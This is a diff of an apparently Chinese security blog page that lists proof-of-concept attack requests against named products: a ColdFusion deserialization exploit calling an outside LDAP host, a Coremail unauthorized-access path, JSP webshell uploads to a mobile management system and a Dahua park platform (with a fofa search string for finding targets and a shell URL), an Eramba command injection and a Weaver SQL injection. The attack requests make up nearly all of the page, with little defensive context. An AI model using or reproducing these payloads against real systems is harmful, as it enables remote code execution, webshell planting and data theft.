-<h2 id="Adobe-ColdFusion-反序列化漏洞（CVE-2023-29300）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2023-29300）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2023-29300）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2023-29300）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1</span><br><span class="line">Host: 1.2.3.4:1234</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15</span><br><span class="line">Content-Length: 400</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">cmd: id</span><br><span class="line"></span><br><span class="line">argumentCollection=</span><br><span class="line">&lt;wddxPacket version=&#x27;1.0&#x27;&gt;</span><br><span class="line">    &lt;header/&gt;</span><br><span class="line">    &lt;data&gt;</span><br><span class="line">        &lt;struct type=&#x27;xcom.sun.rowset.JdbcRowSetImplx&#x27;&gt;</span><br><span class="line">            &lt;var name=&#x27;dataSourceName&#x27;&gt;</span><br><span class="line">                &lt;string&gt;ldap://xxx.xxx.xxx:1234/Basic/TomcatEcho&lt;/string&gt;</span><br><span class="line">            &lt;/var&gt;</span><br><span class="line">            &lt;var name=&#x27;autoCommit&#x27;&gt;</span><br><span class="line">                &lt;boolean value=&#x27;true&#x27;/&gt;</span><br><span class="line">            &lt;/var&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">    &lt;/data&gt;</span><br><span class="line">&lt;/wddxPacket&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Adobe-ColdFusion-反序列化漏洞（CVE-2023-29300）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2023-29300）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2023-29300）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2023-29300）</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;CFIDE&#x2F;adminapi&#x2F;base.cfc?method&#x3D; HTTP&#x2F;1.1
+Host: 1.2.3.4:1234
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit&#x2F;605.1.15 (KHTML, like Gecko) Version&#x2F;12.0.3 Safari&#x2F;605.1.15
+Content-Length: 400
+Content-Type: application&#x2F;x-www-form-urlencoded
+Accept-Encoding: gzip
+cmd: id
+
+argumentCollection&#x3D;
+&lt;wddxPacket version&#x3D;&#39;1.0&#39;&gt;
+    &lt;header&#x2F;&gt;
+    &lt;data&gt;
+        &lt;struct type&#x3D;&#39;xcom.sun.rowset.JdbcRowSetImplx&#39;&gt;
+            &lt;var name&#x3D;&#39;dataSourceName&#39;&gt;
+                &lt;string&gt;ldap:&#x2F;&#x2F;xxx.xxx.xxx:1234&#x2F;Basic&#x2F;TomcatEcho&lt;&#x2F;string&gt;
+            &lt;&#x2F;var&gt;
+            &lt;var name&#x3D;&#39;autoCommit&#39;&gt;
+                &lt;boolean value&#x3D;&#39;true&#39;&#x2F;&gt;
+            &lt;&#x2F;var&gt;
+        &lt;&#x2F;struct&gt;
+    &lt;&#x2F;data&gt;
+&lt;&#x2F;wddxPacket&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h2 id="Coremail-邮件系统未授权访问获取管理员账密"><a href="#Coremail-邮件系统未授权访问获取管理员账密" class="headerlink" title="Coremail 邮件系统未授权访问获取管理员账密"></a>Coremail 邮件系统未授权访问获取管理员账密</h2><h5 id="poc"><a href="#poc" class="headerlink" title="poc:"></a>poc:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&amp;mid=2247485877&amp;idx=1&amp;sn=7e5f77db320ccf9013c0b7aa72626e68&amp;chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&amp;scene=2</span><br></pre></td></tr></table></figure>
+<h2 id="Coremail-邮件系统未授权访问获取管理员账密"><a href="#Coremail-邮件系统未授权访问获取管理员账密" class="headerlink" title="Coremail 邮件系统未授权访问获取管理员账密"></a>Coremail 邮件系统未授权访问获取管理员账密</h2><h5 id="poc"><a href="#poc" class="headerlink" title="poc:"></a>poc:</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;coremail&#x2F;common&#x2F;assets&#x2F;;l;&#x2F;;&#x2F;;&#x2F;;&#x2F;;&#x2F;s?biz&#x3D;Mzl3MTk4NTcyNw&#x3D;&#x3D;&amp;mid&#x3D;2247485877&amp;idx&#x3D;1&amp;sn&#x3D;7e5f77db320ccf9013c0b7aa72626e68&amp;chksm&#x3D;eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&amp;scene&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h2 id="移动管理系统-uploadApk-do-任意文件上传漏洞"><a href="#移动管理系统-uploadApk-do-任意文件上传漏洞" class="headerlink" title="移动管理系统 uploadApk.do 任意文件上传漏洞"></a>移动管理系统 uploadApk.do 任意文件上传漏洞</h2><h5 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:port</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryvLTG6zlX0gZ8LzO3</span><br><span class="line">Content-Disposition: form-data; name=&quot;downloadpath&quot;; filename=&quot;a.jsp&quot;</span><br><span class="line">Content-Type: application/msword</span><br><span class="line"></span><br><span class="line">hello  //可以替换成木马</span><br></pre></td></tr></table></figure>
+<h2 id="移动管理系统-uploadApk-do-任意文件上传漏洞"><a href="#移动管理系统-uploadApk-do-任意文件上传漏洞" class="headerlink" title="移动管理系统 uploadApk.do 任意文件上传漏洞"></a>移动管理系统 uploadApk.do 任意文件上传漏洞</h2><h5 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h5><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;maportal&#x2F;appmanager&#x2F;uploadApk.do?pk_obj&#x3D; HTTP&#x2F;1.1
+Host: xxx.xxx.xxx.xxx:port
+Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;114.0.0.0 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
+Cookie: JSESSIONID&#x3D;4ABE9DB29CA45044BE1BECDA0A25A091.server
+Connection: close
+
+------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+Content-Disposition: form-data; name&#x3D;&quot;downloadpath&quot;; filename&#x3D;&quot;a.jsp&quot;
+Content-Type: application&#x2F;msword
+
+hello  &#x2F;&#x2F;可以替换成木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h2 id="大华智慧园区综合管理平台"><a href="#大华智慧园区综合管理平台" class="headerlink" title="大华智慧园区综合管理平台"></a>大华智慧园区综合管理平台</h2><p>​		大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。 该设备开放了文件上传功能，但未在上传的文件类型、大小、格式、路径等方面进行严格的限制和过滤，导致攻击者可以通过构造恶意文件并上传到设备上。</p>
 <h5 id="fofa特征搜索："><a href="#fofa特征搜索：" class="headerlink" title="fofa特征搜索："></a>fofa特征搜索：</h5><p>“&#x2F;WPMS&#x2F;asset&#x2F;lib&#x2F;gridster&#x2F;“</p>
 <p><img src="/2023/08/19/1/2.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.26.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 232</span><br><span class="line">Content-Type: multipart/form-data; boundary=f3aeb22be281d77542546a2f71e20982</span><br><span class="line"></span><br><span class="line">--f3aeb22be281d77542546a2f71e20982</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;a.jsp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Transfer-Encoding: binary</span><br><span class="line"></span><br><span class="line">23332143454e</span><br><span class="line">--f3aeb22be281d77542546a2f71e20982--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;emap&#x2F;devicePoint_addImgIco?hasSubsystem&#x3D;true HTTP&#x2F;1.1
+Host: 127.0.0.1
+User-Agent: python-requests&#x2F;2.26.0
+Accept-Encoding: gzip, deflate
+Accept: *&#x2F;*
+Connection: Keep-Alive
+Content-Length: 232
+Content-Type: multipart&#x2F;form-data; boundary&#x3D;f3aeb22be281d77542546a2f71e20982
+
+--f3aeb22be281d77542546a2f71e20982
+Content-Disposition: form-data; name&#x3D;&quot;upload&quot;; filename&#x3D;&quot;a.jsp&quot;
+Content-Type: application&#x2F;octet-stream
+Content-Transfer-Encoding: binary
+
+23332143454e
+--f3aeb22be281d77542546a2f71e20982--
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <p><img src="/2023/08/19/1/3.png"></p>
-<h5 id="shell连接地址："><a href="#shell连接地址：" class="headerlink" title="shell连接地址："></a>shell连接地址：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/upload/emap/society_new/返回地文件名.jsp</span><br></pre></td></tr></table></figure>
+<h5 id="shell连接地址："><a href="#shell连接地址：" class="headerlink" title="shell连接地址："></a>shell连接地址：</h5><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;upload&#x2F;emap&#x2F;society_new&#x2F;返回地文件名.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
 <h2 id="Eramba任意代码执行漏洞"><a href="#Eramba任意代码执行漏洞" class="headerlink" title="Eramba任意代码执行漏洞"></a>Eramba任意代码执行漏洞</h2><p>影响版本：Enterprise and Community edition &lt;&#x3D; 3.19.1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /settings/download-test-pdf?path=ip%20a; HTTP/1.1</span><br><span class="line">Host: [redacted]</span><br><span class="line">Cookie: translation=1; csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID=14j6sfroe6t2g1mh71g2a1vjg8</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: de,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://[redacted]/settings</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;settings&#x2F;download-test-pdf?path&#x3D;ip%20a; HTTP&#x2F;1.1
+Host: [redacted]
+Cookie: translation&#x3D;1; csrfToken&#x3D;1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID&#x3D;14j6sfroe6t2g1mh71g2a1vjg8
+User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;111.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: de,en-US;q&#x3D;0.7,en;q&#x3D;0.3
+Accept-Encoding: gzip, deflate
+Referer: https:&#x2F;&#x2F;[redacted]&#x2F;settings
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h2 id="泛微-HrmCareerApplyPerView-SQL注入漏洞"><a href="#泛微-HrmCareerApplyPerView-SQL注入漏洞" class="headerlink" title="泛微 HrmCareerApplyPerView SQL注入漏洞"></a>泛微 HrmCareerApplyPerView SQL注入漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7443</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<h2 id="泛微-HrmCareerApplyPerView-SQL注入漏洞"><a href="#泛微-HrmCareerApplyPerView-SQL注入漏洞" class="headerlink" title="泛微 HrmCareerApplyPerView SQL注入漏洞"></a>泛微 HrmCareerApplyPerView SQL注入漏洞</h2><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;pweb&#x2F;careerapply&#x2F;HrmCareerApplyPerView.jsp?id&#x3D;1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP&#x2F;1.1
+Host: 127.0.0.1:7443
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit&#x2F;605.1.15 (KHTML,like Gecko)
+Accept-Encoding: gzip, deflate
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
     </article>
